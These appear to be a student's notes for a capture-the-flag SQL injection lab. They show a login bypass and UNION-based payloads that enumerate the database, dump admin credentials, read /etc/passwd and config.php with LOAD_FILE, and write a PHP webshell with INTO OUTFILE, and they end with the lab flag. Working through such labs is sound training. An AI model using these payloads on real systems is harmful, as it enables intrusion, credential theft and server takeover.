  

### Hint

### Try to read files you know to find a location you can write to.

â€”>

ðŸ’¡

we will need to make webshell

  

  

first when i opened the link i found :

login page :

![[Untitled 5.png|Untitled 5.png]]

found this on the source :

`<!-- partial:index.partial.html -->`

we need to login :

trials :

```
'' OR '1'='1' -- - 
```

as i thought the infected part is the username not the password .

Logged in :

![[Untitled 1 2.png|Untitled 1 2.png]]

  

  

i found search bar :

lets see:

okay i found that it gives also an error msg when i input error .

first we will knew how many columns do we have :

```
 'UNION select 1,2,3,4,5  -- -           
```

okay using that command i could knew that it is:

5 columns , and first one is not seen

![[Untitled 2 3.png|Untitled 2 3.png]]

  

Lets see our user name :

```
'UNION select 1,USER(),3,4,5  -- -   
```

root@localhost

  

as it is the root we will assume that it can write and read

  

  

Lets see the INFORMATION_SCHEMA to get the webroot place:

lets see all the databases that are presented :

```
'UNION select 1,SCHEMA_NAME,3,4,5 from INFORMATION_SCHEMA.schemata-- -   
```

![[Untitled 3 2.png|Untitled 3 2.png]]

  

WHAT WE WILL CARE ABOUT are :

backup and ilfreight

but only backup matters

  

we will go to see the tables that backup database contains

  

```
'UNION select 1,table_NAME,table_schema,4,5 from information_schema.tables-- -   
```

![[Untitled 4 2.png|Untitled 4 2.png]]

so there is a table called :

admin_bk

we need to knew how many columns on admin_bk

```
'UNION select 1,column_NAME,table_schema,4,5 from information_schema.columns WHERE table_name='admin_bk'-- -   
```

![[Untitled 5 2.png|Untitled 5 2.png]]

now lets see what do they contain :) :

```
'UNION select 1,username, password,4,5 from backup.admin_bk-- -   
```

we got :

![[Untitled 6.png]]

username = admin

password = Inl@n3_fre1gh7_adm!n

  

  

we will need to see our privilages:

```
cn' UNION SELECT 1, grantee, privilege_type, 4,5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

via :

root@localhost â€”> we can do anything

lets try the found account :

![[Untitled 7.png]]

now lets try reading files we knew :

LOAD_FILE("/etc/passwd")

```
'UNION select 1,LOAD_FILE("/etc/passwd"), 3,4,5 -- -   
```

okay we now are reading file /etc/passwd:  

![[Untitled 8.png]]

  

lets try anther file:

/var/www/html/

```
'UNION select 1,LOAD_FILE("/var/www/html/dashboard/dashboard.php"), 3,4,5 -- -   
```

![[Untitled 9.png]]

  

  

in the source code i found :

`include "../config.php";`

so there is a place called config.php lets try to load_file it

  

```
'UNION select 1,LOAD_FILE("/var/www/html/config.php"), 3,4,5 -- -   
```

![[Untitled 10.png]]

i found those things :

```
$config = array(
'DB_HOST' => '127.0.0.1',
'DB_USERNAME' => 'root',
'DB_PASSWORD' => 'password',
'DB_DATABASE' => 'ilfreight'
);
```

we will use mysql on them :

mysql -u root -ppassword -h 127.0.0.1

it is not connecting i think the problem is with the ip

  

okay after revising i found that i already have access to

/var/www/html/ so lets create our webshell here :

first we will just test it :

```
'UNION select '',"<?php system($_REQUEST[0]);?>", '','','' into outfile'/var/www/html/dashboard/shell.php' -- -   
```

Can't create/write to file '/var/www/html/hello.txt' (Errcode: 13 "Permission denied")

  

  

```
' union select 1,variable_name,variable_value,4,5 from information_schema.global_variables where variable_name='secure_file_priv' -- -
```

  

it is a blank which means we can do it anywhere:

  

  

  

read files we knew :

```
'UNION select 1,LOAD_FILE("/var/www/html/index.php"), 3,4,5 -- -   
```

![[Untitled 11.png]]

  

  

  

i found that what where stopping me is that i should try to write in /var/www/html/dashboard/shell.php

and i modified the upper command on here :)

after doing this it worked.

okay now we will go to use the webshell and search for the flag

  

  

finally

![[Untitled 12.png]]

the flag is 528d6d9cedc2c7aab146ef226e918396